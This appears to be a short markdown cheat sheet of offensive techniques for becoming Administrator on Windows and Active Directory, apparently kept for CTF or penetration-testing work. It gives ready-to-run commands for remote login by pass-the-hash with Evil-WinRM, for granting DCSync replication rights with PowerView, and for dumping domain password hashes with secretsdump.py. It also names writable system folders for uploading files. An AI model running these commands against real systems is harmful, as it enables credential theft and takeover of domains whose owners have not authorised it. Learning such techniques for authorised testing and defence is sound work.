# Windows
Everything to check for when trying to become Administrator on windows


# Commands
- `powershell -c get-psdrive -psprovider filesystem` –-> To get drives
- `dir /R` --> To look for hidden data streams (if flag is hidden)


# Directories
- C:\Windows\System32\spool\drivers\color
    - To upload files to
- C:\Data\Users\app>
    - Old windows versions
- C:\program files\windowspowershell\modules\packagemanagement
    - Check for any code, policy or password in files


# Tools
## BloodHound / SharpHound
This is used to visualise AD environments and discover attack paths.

### Useful info
- [https://bloodhound.readthedocs.io/en/latest/index.html](https://bloodhound.readthedocs.io/en/latest/index.html)
- [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)


## Evil-WinRM
Allows remote login to WinRM *(port 5985)* if credentials are known.

### Usage

```bash
# With password
evil-winrm -i <ip> -u <user> -p <password>

# With Pass The Hash (NTLM)
evil-winrm -i <ip> -u <user> -H <hash>
```

#### References
- [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)


## secretsdump.py
Helps to enumerate and dump AD hashes

#### References & link to the tool
- [https://github.com/fortra/impacket/blob/master/examples/secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)


# Misconfigurations
## DCSync
DCSync is a technique used to extract credentials from the Domain Controllers.    
In this we mimic a Domain Controller and leverage the (MS-DRSR) protocol and request for replication using GetNCChanges function.

### Add rights in PowerView
```powershell
Add-ObjectACL -PrincipalIdentity <user> -Rights DCSync
```

### Enumeration
**Note: Most of this will be done in PowerView**
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile hashes
```

#### References
- [https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)